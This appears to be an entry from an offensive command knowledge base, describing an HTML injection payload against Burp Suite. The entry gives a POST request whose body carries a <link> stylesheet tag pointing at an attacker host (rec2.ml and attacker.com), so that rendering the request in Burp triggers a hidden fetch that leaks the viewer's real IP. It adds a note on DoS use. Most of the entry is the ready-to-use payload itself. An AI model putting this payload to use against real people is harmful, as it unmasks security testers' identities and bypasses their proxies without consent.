---
id: cmd-post-link-injection
data: |-
  POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  =<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
tags:
  - html-injection
  - ip-leak
type: command
output: >-
  Burp Suite makes hidden HTTP request to http://www.rec2.ml/leak, leaking
  victim's real IP.
executor: http
platforms:
  - Desktop
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:56.371Z'
verified: false
validated: true
submitted: true
---
# POST-Request-with-LINK-Tag-Injection

## Command

```http
POST /burpsuite_leak_vuln-leak_impact.html HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'>
```

## Description

This HTTP POST request embeds an HTML <link> tag in the body to force a stylesheet fetch upon rendering in Burp Suite, bypassing proxies and leaking the victim's IP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Body: =<html><link+rel='stylesheet'+href='http://www.rec2.ml/leak'> | HTML payload with link href to attacker URL | Yes |
| Content-Type: application/x-www-form-urlencoded | Sets body encoding | Yes |

## Examples

### Basic Usage

```http
POST /target HTTP/1.1
Content-Type: application/x-www-form-urlencoded

=<html><link rel='stylesheet' href='http://attacker.com/leak'>
```

### Advanced Usage

Use for DoS: href to slow endpoint.

## Expected Output

Rendering in Burp triggers a hidden GET to the href URL, with victim's real IP exposed in the request.

## Related

- [[commands/GET-Request-with-IMG-Tag-Injection]]
- [[procedures/Craft-Malicious-HTTP-Request-with-HTML-Injection]]
